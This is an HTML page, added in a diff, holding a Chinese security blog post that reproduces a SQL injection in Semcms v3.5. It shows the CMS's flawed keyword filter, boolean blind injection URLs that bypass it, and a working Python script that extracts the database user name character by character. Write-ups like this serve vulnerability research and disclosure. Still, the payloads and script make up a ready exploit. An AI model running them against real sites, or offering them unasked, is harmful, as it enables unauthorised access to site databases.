@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Semcms v3.5 sql注入漏洞一、漏洞简介二、漏洞影响Semcms v3.5 三、复现过程漏洞分析在分析过程中看到网上已经有人发现semcmsV2.4存在过滤不严导致sql注入的漏洞，不知道咋还没改，而且最新版过滤的关键字更少了。 首先查看首页文件index.php的代码 1 &lt;?php 2 include_once  &#39;Include&#x2F;web_inc.php&#39;; 3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Semcms/Semcms%20v3.5%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Semcms v3.5 sql注入漏洞一、漏洞简介二、漏洞影响Semcms v3.5 三、复现过程漏洞分析在分析过程中看到网上已经有人发现semcmsV2.4存在过滤不严导致sql注入的漏洞，不知道咋还没改，而且最新版过滤的关键字更少了。 首先查看首页文件index.php的代码 1 &lt;?php 2 include_once  &#39;Include&#x2F;web_inc.php&#39;; 3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Semcmsv3.5sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Semcmsv3.5sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Semcmsv3.5sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.png">
+<meta property="article:published_time" content="2022-07-08T06:26:03.538Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.403Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Semcmsv3.5sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Semcms/Semcms v3.5 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Semcms/Semcms%20v3.5%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:03.538Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Semcms-v3-5-sql注入漏洞"><a href="#Semcms-v3-5-sql注入漏洞" class="headerlink" title="Semcms v3.5 sql注入漏洞"></a>Semcms v3.5 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Semcms v3.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在分析过程中看到网上已经有人发现semcms<br>V2.4存在过滤不严导致sql注入的漏洞，不知道咋还没改，而且最新版过滤的关键字更少了。</p>
+<p>首先查看首页文件index.php的代码</p>
+<pre><code>1 &lt;?php
+2 include_once  &#39;Include/web_inc.php&#39;;
+3 include_once  &#39;Templete/default/Include/Function.php&#39;;
+4 $file_url=&quot;&quot;;
+5 include_once  &#39;Templete/default/Include/default.php&#39;;
+6 ?&gt;
+ 1 //网站logo
+ 2 
+ 3 $weblogo=$web_url_meate.str_replace(&#39;../&#39;,&#39;&#39;,$row[&#39;web_logo&#39;]);
+ 4 
+ 5 // 控制文字标签 更改 获取的 语种 id
+ 6 
+ 7 if (isset($_GET[&quot;languageIDD&quot;]))&#123;$Language=test_input(verify_str($_GET[&quot;languageIDD&quot;]));&#125;else&#123;$Language=verify_str($Language);&#125;
+ 8 
+ 9 if(!empty($Language))&#123;
+10 
+11       //网站SEO设定
+12 
+13       $query=$db_conn-&gt;query(&quot;select * from sc_tagandseo where languageID=$Language&quot;);
+14       $row=mysqli_fetch_array($query);
+15       $tag_indexmetatit=datato($row[&#39;tag_indexmetatit&#39;]);// 首页标题
+ 1 // 防sql入注
+ 2 
+ 3 if (isset($_GET))&#123;$GetArray=$_GET;&#125;else&#123;$GetArray=&#39;&#39;;&#125; 　　　　//所有GET方式提交的变量都进行防注入检查
+ 4  
+ 5 foreach ($GetArray as $value)&#123; //get
+ 6     
+ 7     verify_str($value);
+ 8   
+ 9 &#125;
+10 
+11 function inject_check_sql($sql_str) &#123;
+12   
+13      return preg_match(&#39;/select|insert|=|%|&lt;|between|update|\&#39;|\*|union|into|load_file|outfile/i&#39;,$sql_str);　　　　//过滤关键字
+14 &#125; 
+15 
+16 function verify_str($str) &#123; 
+17  
+18    if(inject_check_sql($str)) &#123;
+19    
+20        exit(&#39;Sorry,You do this is wrong! (.-.)&#39;);　　　　　　//如果出现关键字则提示
+21     &#125; 
+22  
+23     return $str; 
+24 &#125;
+ 1 function test_input($data) &#123; 　　　　　　　　　　　　　　　　　　//防止XSS
+ 2       $data = str_replace(&quot;&lt;script&quot;, &quot;&quot;, $data);
+ 3       $data = str_replace(&quot;&lt;/script&gt;&quot;, &quot;&quot;, $data);
+ 4       $data = str_replace(&quot;%&quot;, &quot;percent&quot;, $data);
+ 5       $data = trim($data);
+ 6       $data = stripslashes($data);
+ 7       $data = htmlspecialchars($data,ENT_QUOTES);　　　　//实体编码
+ 8       return $data;
+ 9 
+10    &#125;
+</code></pre>
+<p>　　可以看到第16行的函数verify_str()调用inject_check_sql()用来过滤危险字符，函数test_input用来过滤xss。其中可以明显地看到第11行的函数inject_check_sql()采用白名单的方式是有缺陷的，我们可以用布尔盲注来绕过</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><pre><code>http://0-sec.org/SEMCMS_PHP_3.5/index.php?languageIDD=1 and strcmp(left(user(),1), 0x72) rlike 0　　　　显示正常
+</code></pre>
+<p><img src="/resource/Semcmsv3.5sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<pre><code>http://0-sec.org/SEMCMS_PHP_3.5/index.php?languageIDD=1 and strcmp(left(user(),1), 0x73) rlike 0　　　　显示错误
+</code></pre>
+<p><img src="/resource/Semcmsv3.5sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>参考网上已有的fuzz盲注脚本改了下，代码如下</p>
+<pre><code>#用python3版本
+import requests
+url = &quot;http://172.19.77.44/SEMCMS_PHP_3.5/index.php?languageIDD=1&quot;
+print(&quot;Testing url: &quot; + url)
+#十进制数33-126间的ascii hex值
+payload = [&quot;0x21&quot;,&quot;0x22&quot;,&quot;0x23&quot;,&quot;0x24&quot;,&quot;0x25&quot;,&quot;0x26&quot;,&quot;0x27&quot;,&quot;0x28&quot;,&quot;0x29&quot;,&quot;0x2a&quot;,
+            &quot;0x2b&quot;,&quot;0x2c&quot;,&quot;0x2d&quot;,&quot;0x2e&quot;,&quot;0x2f&quot;,&quot;0x30&quot;,&quot;0x31&quot;,&quot;0x32&quot;,&quot;0x33&quot;,&quot;0x34&quot;,
+            &quot;0x35&quot;,&quot;0x36&quot;,&quot;0x37&quot;,&quot;0x38&quot;,&quot;0x39&quot;,&quot;0x3a&quot;,&quot;0x3b&quot;,&quot;0x3c&quot;,&quot;0x3d&quot;,&quot;0x3e&quot;,
+            &quot;0x3f&quot;,&quot;0x40&quot;,&quot;0x41&quot;,&quot;0x42&quot;,&quot;0x43&quot;,&quot;0x44&quot;,&quot;0x45&quot;,&quot;0x46&quot;,&quot;0x47&quot;,&quot;0x48&quot;,
+            &quot;0x49&quot;,&quot;0x4a&quot;,&quot;0x4b&quot;,&quot;0x4c&quot;,&quot;0x4d&quot;,&quot;0x4e&quot;,&quot;0x4f&quot;,&quot;0x50&quot;,&quot;0x51&quot;,&quot;0x52&quot;,
+            &quot;0x53&quot;,&quot;0x54&quot;,&quot;0x55&quot;,&quot;0x56&quot;,&quot;0x57&quot;,&quot;0x58&quot;,&quot;0x59&quot;,&quot;0x5a&quot;,&quot;0x5b&quot;,&quot;0x5c&quot;,
+            &quot;0x5d&quot;,&quot;0x5e&quot;,&quot;0x5f&quot;,&quot;0x60&quot;,&quot;0x61&quot;,&quot;0x62&quot;,&quot;0x63&quot;,&quot;0x64&quot;,&quot;0x65&quot;,&quot;0x66&quot;,
+            &quot;0x67&quot;,&quot;0x68&quot;,&quot;0x69&quot;,&quot;0x6a&quot;,&quot;0x6b&quot;,&quot;0x6c&quot;,&quot;0x6d&quot;,&quot;0x6e&quot;,&quot;0x6f&quot;,&quot;0x70&quot;,
+            &quot;0x71&quot;,&quot;0x72&quot;,&quot;0x73&quot;,&quot;0x74&quot;,&quot;0x75&quot;,&quot;0x76&quot;,&quot;0x77&quot;,&quot;0x78&quot;,&quot;0x79&quot;,&quot;0x7a&quot;,
+            &quot;0x7b&quot;,&quot;0x7c&quot;,&quot;0x7d&quot;
+           ]
+user = &quot;&quot;
+for b in range(len(payload)):
+    for a in payload:
+        #sql_payload_user = &quot; and strcmp(substr(database(),%s,1), 0x%s) rlike 0&quot; % (b+1, a.replace(&quot;0x&quot;,&quot;&quot;))    #当前数据库名称
+        sql_payload_user = &quot; and strcmp(substr(user(),%s,1), 0x%s) rlike 0&quot; % (b+1, a.replace(&quot;0x&quot;,&quot;&quot;))            #当前数据库用户名
+        res = requests.get(url + sql_payload_user).text
+        res1 = requests.get(url).text
+        if len(res) == len(res1):        #如果返回的内容长度大小一样，则表示匹配成功
+            user = user + a
+            print(&quot; &quot;)
+            print(&quot;[*]info : 0x&quot; + user.replace(&quot;0x&quot;,&quot;&quot;).upper())
+            break
+        else:
+            print(&#39;\r&#39;,&quot;Match failed,Next.....&quot;,end=&#39;&#39;)
+</code></pre>
+<p>测试结果如下图</p>
+<p><img src="/resource/Semcmsv3.5sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<p>解码ascii<br>hex值0x726F6F74406C6F63616C686F7374为root@localhost。当然因为过滤了select，获取表名就有点困难了，t00ls中看到有人介绍用selselectect来绕过的方式跟这个CMS的过滤方式是不一样的，所以行不通。暂时想到的办法是可以找一与验证密码有关的注点，因为这个注点包含表名，所以可以通过fuzz猜测其字段名，最后通过字段名取得字段值，可以看下这篇文章<a target="_blank" rel="noopener" href="https://depthsecurity.com/blog/blind-sql-injection-burpsuite-like-a-boss">blind-sql-injection-burpsuite-like-a-boss(要翻墙)</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/st404/p/10087191.html">https://www.cnblogs.com/st404/p/10087191.html</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Semcms/Semcms%20v3.5%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qvlq00gfy8v14izpgswk" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Semcms/Semcms%20v3.8%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Semcms/Semcms%20v2.7%20%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
